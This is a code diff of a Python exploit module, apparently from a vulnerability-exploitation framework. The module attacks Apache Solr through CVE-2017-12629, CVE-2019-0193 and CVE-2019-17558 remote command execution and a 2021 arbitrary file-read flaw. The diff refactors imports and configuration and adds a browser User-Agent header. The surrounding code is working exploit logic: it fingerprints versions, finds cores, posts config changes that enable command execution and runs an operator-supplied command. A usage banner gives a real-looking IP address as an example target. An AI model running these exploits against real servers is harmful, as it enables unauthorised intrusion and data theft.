@@ -1,20 +1,17 @@
 import random,string,requests,json,re
 from requests_toolbelt.utils import dump
-from ClassCongregation import _urlparse
+from ClassCongregation import _urlparse,PocType_,verify
 from urllib.parse import urlparse, quote
 from operator import methodcaller
-import CodeTest
 ################
 ##--ApacheSolr--##
 #cve_2017_12629 无回显的命令执行, 默认VULN = None, 7.1.0以上(包含)版本已删除RunExecutableListener
 #cve_2019_0193  无回显的命令执行，默认VULN = None
 #cve_2019_17558 有回显的命令执行, 设置VULN = True
 ################
-#echo VuLnEcHoPoCSuCCeSS
-#VULN = None => 漏洞测试
-#VULN = True => 命令执行
-VULN = ''
-TIMEOUT = ''
+CMD = verify.CMD
+VULN = verify.VULN
+TIMEOUT = verify.TIMEOUT
 class ApacheSolr():
     def __init__(self, url, CMD):
         self.url = url
@@ -83,12 +80,16 @@ class ApacheSolr():
         }
         self.method = "post"
         self.r = "PoCWating"
+        self.headers = {
+            'User-agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',
+            #'Content-Type' : 'application/x-www-form-urlencoded',
+        }
         try:
-            self.request = requests.get(url=self.url+"/solr/", headers=CodeTest.headers, timeout=TIMEOUT, verify=False)
+            self.request = requests.get(url=self.url+"/solr/", headers=self.headers, timeout=TIMEOUT, verify=False)
             if self.request.status_code == 200:
                 self.get_ver = re.findall(r'img/favicon\.ico\?_=(.*)"', self.request.text)[0]
                 self.ver = self.get_ver.replace(".", "")
-            self.request = requests.get(url=self.urlcore, headers=CodeTest.headers, timeout=TIMEOUT, verify=False)
+            self.request = requests.get(url=self.urlcore, headers=self.headers, timeout=TIMEOUT, verify=False)
             try:
                 self.corename = list(json.loads(self.request.text)["status"])[0]
             except:
@@ -98,14 +99,14 @@ class ApacheSolr():
                 self.r = "PoCSuCCeSS"
             self.request = requests.post(self.url+"/solr/"+str(self.corename)+"/update", data=self.payload2, headers=self.headers_solr2, timeout=TIMEOUT, verify=False)
             self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
-            self.info = CodeTest.Colored_.rce()+" [activemq version: " + self.get_ver + "]"+" [newcore:"+self.newcore+"] "
-            CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
+            self.info = PocType_.rce()+" [activemq version: " + self.get_ver + "]"+" [newcore:"+self.newcore+"] "
+            verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
         except requests.exceptions.Timeout as error:
-            CodeTest.verify.timeout_output(self.pocname)
+            verify.timeout_output(self.pocname)
         except requests.exceptions.ConnectionError as error:
-            CodeTest.verify.connection_output(self.pocname)
+            verify.connection_output(self.pocname)
         except Exception as error:
-            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
 
     def cve_2019_0193(self):
         self.pocname = "Apache Solr: CVE-2019-0193"
@@ -142,14 +143,14 @@ class ApacheSolr():
             if self.request.status_code==200 and self.corename!="null":
                 self.r = "PoCSuCCeSS"
             self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
-            self.info = CodeTest.Colored_.rce()+" [corename:"+str(self.corename)+"]"
-            CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
+            self.info = PocType_.rce()+" [corename:"+str(self.corename)+"]"
+            verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
         except requests.exceptions.Timeout as error:
-            CodeTest.verify.timeout_output(self.pocname)
+            verify.timeout_output(self.pocname)
         except requests.exceptions.ConnectionError as error:
-            CodeTest.verify.connection_output(self.pocname)
+            verify.connection_output(self.pocname)
         except Exception as error:
-            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
 
     def cve_2019_17558(self):
         self.pocname = "Apache Solr: CVE-2019-17558"
@@ -166,7 +167,7 @@ class ApacheSolr():
                 self.corename = list(json.loads(self.request.text)["status"])[0]
             except:
                 pass
-            self.info = CodeTest.Colored_.rce()+" [corename:"+str(self.corename)+"]"
+            self.info = PocType_.rce()+" [corename:"+str(self.corename)+"]"
             self.urlapi = self.url+"/solr/"+str(self.corename)+"/config"
             self.headers_json = {'Content-Type': 'application/json'}
             self.set_api_data = """
@@ -186,20 +187,20 @@ class ApacheSolr():
                 self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
                 if self.request.status_code == 200 and self.corename != None:
                     self.r = "PoCSuCCeSS"
-                    CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
+                    verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
                 else:
-                    CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
+                    verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
             else:
                 self.request = requests.post(self.urlapi, data=self.set_api_data, headers=self.headers_json, timeout=TIMEOUT, verify=False)
                 self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
                 self.request = requests.get(self.url+"/solr/"+str(self.corename)+self.payload_2, timeout=TIMEOUT, verify=False)
-                CodeTest.verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
+                verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
         except requests.exceptions.Timeout as error:
-            CodeTest.verify.timeout_output(self.pocname)
+            verify.timeout_output(self.pocname)
         except requests.exceptions.ConnectionError as error:
-            CodeTest.verify.connection_output(self.pocname)
+            verify.connection_output(self.pocname)
         except Exception as error:
-            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
 
     def cve_20210408_filereading(self):
         self.pocname = 'Apachesolr:CVE_20210408'
@@ -217,18 +218,18 @@ class ApacheSolr():
                 self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
                 if r"root" in self.request.text or r"系统找不到" in self.request.text:
                     self.r = 'PoCSuCCeSS'
-                    CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
+                    verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
                 else:
-                    CodeTest.verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
+                    verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
             else:
                 self.request = requests.get(self.url + self.path.format(self.corename,self.CMD), data=self.data, headers=self.headers, timeout=TIMEOUT, verify=False)
-                CodeTest.verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
+                verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
         except requests.exceptions.Timeout as error:
-            CodeTest.verify.timeout_output(self.pocname)
+            verify.timeout_output(self.pocname)
         except requests.exceptions.ConnectionError as error:
-            CodeTest.verify.connection_output(self.pocname)
+            verify.connection_output(self.pocname)
         except Exception as error:
-            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
 
 print("""eg: http://106.53.249.95:8983
 +-------------------+------------------+-----+-----+-------------------------------------------------------------+
@@ -239,15 +240,7 @@ print("""eg: http://106.53.249.95:8983
 | Apache Solr       | cve_2019_17558   |  Y  |  Y  | 5.0.0 - 8.3.1, velocity response writer rce                 |
 +-------------------+------------------+-----+-----+-------------------------------------------------------------+""")
 def check(**kwargs):
-    global VULN,TIMEOUT
-    VULN = kwargs['vuln']
-    TIMEOUT = int(kwargs['timeout'])
-    CodeTest.Verification.CMD = kwargs['cmd']
-    CodeTest.Verification.VULN = kwargs['vuln']
-    if VULN == 'False':
-        ExpApacheSolr = ApacheSolr(_urlparse(kwargs['url']),"echo VuLnEcHoPoCSuCCeSS")
-    else:
-        ExpApacheSolr = ApacheSolr(_urlparse(kwargs['url']),kwargs['cmd'])
+    ExpApacheSolr = ApacheSolr(_urlparse(kwargs['url']),CMD)
     if kwargs['pocname'] != 'ALL':
         func = getattr(ExpApacheSolr, kwargs['pocname'])#返回对象函数属性值，可以直接调用
         func()#调用函数
